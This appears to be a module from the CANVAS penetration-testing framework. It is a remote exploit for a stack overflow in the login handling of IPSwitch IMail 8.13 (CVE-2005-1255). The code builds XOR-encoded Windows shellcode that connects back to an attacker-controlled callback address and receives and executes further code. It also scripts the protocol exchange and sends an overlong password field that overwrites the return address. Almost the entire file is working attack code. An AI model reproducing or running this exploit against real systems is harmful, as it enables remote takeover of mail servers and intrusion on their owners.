#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator


NAME="imail_imap"
DESCRIPTION="imail imap4 stack overflow in Login field"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="IPSwitch"
DOCUMENTATION["Repeatability"]="This is a one shot exploit."
DOCUMENTATION["VersionsAffected"]="IMail 8.13 "
DOCUMENTATION["CVE Name"] = "CVE-2005-1255"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1255"
DOCUMENTATION['CVSS'] = 10.0


VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES="""

"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit
    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=1761
        self.host=""
        self.badstring="\x00\r\n@%\"*\\/"
        self.ssl=0
        self.setVersions()
        self.version=1
        self.searchbadstring="\x00\r\n? /\\&"
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, geteip, writeloc
        self.versions[1]=("Zen version X",0x7Cd08525)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        #self.shellcode="\xcc"*400
        #return 1
        host=self.callback.ip
        port=self.callback.port
        import shellcodeGenerator
        sc=shellcodeGenerator.win32()
        #no gocode - too big
        #sc.addAttr("GOFindSock",None)
        #sc.addAttr("LoadRegAsFD", {"reg" : "esi"})
        #sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("tcpconnect",{"port":port,"ipaddress":host})
        sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF

        sc.addAttr("UseWS2Ordinal",None)
        rawshellcode=sc.get()
        import xorencoder
        enc=xorencoder.simpleXOR()
        enc.subesp=5000
        enc.setbadstring(self.badstring)
        ret=enc.find_key(rawshellcode)
        if ret==0:
            self.log("Could not generate key for this shellcode!")
            raise Exception, "No shellcode generated"
        
        self.shellcode=enc.encode(rawshellcode)
        if self.shellcode=="":
            raise Exception, "No shellcode generated"
        self.log("Xor key used: %x"%enc.getkey())
        self.log("Length of shellcode=%s"%len(self.shellcode))
        return ret
    
    def test(self):
        """
        
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        self.version=1
        return 1
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            if not self.test():
                self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
            return 0
        
        if not self.negotiate_console(s):
            self.log("Could not negotiate version!")
            return 0
        
        self.log("Sending authentication type")
        s.sendall("\x00\x01")
        
        self.log("Sending length of first chunk")
        if 0:
            #bug0
            s.sendall("\xff\xff")
            s.sendall("\xff"*0xffff)
        else:
            #send two chunks with nothing
            for i in range(0,2):
                s.sendall("\x00\x04") 
                s.sendall("\x00"*4)
        self.log("Sending remote operation type")
        s.sendall("\x00\x02") #< 6
        self.log("Getting remote operation type response")
        data=s.recv(2)
        self.log("Doing password auth")
        s.sendall("\x00\x01")
        self.log("Getting password length")
        data=s.recv(2)
        length=ord(data[0])+ord(data[1])<<8
        data=s.recv(length)
        self.log("Sending Authentication Type")
        s.sendall("\x00\x02")
        #password length > 0x1c overflows stack
        s.sendall(halfword2bstr(len(sploitstring)))
        s.sendall(sploitstring)
        
        ret=self.ISucceeded()
        if not ret:
            self.log("Sleeping for two seconds to check for callback")
            time.sleep(2)
            ret=self.ISucceeded()
        self.setInfo("%s attacking %s:%d - done (success=%d!)"%(NAME,self.host,self.port,ret))
        return ret
        
    def negotiate_console(self,s):
        version="\x01\x03\x00\x00\x01\x04\x01\x01\x94\xff\xe7\x00\x5c\xfd\xe7\x00"
        s.sendall(version)
        data=s.recv(16)
        return 1
        
    def makesploit(self):
        """
        Construct the attack
        imail will tack \Users on the end of the string
        """

        geteip=self.versions[self.version][1]
        offset=32
        sploitstring="A"*500
        sploitstring=stroverwrite(sploitstring,intel_order(geteip),32) 
        sploitstring=stroverwrite(sploitstring,self.shellcode,80) 
        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
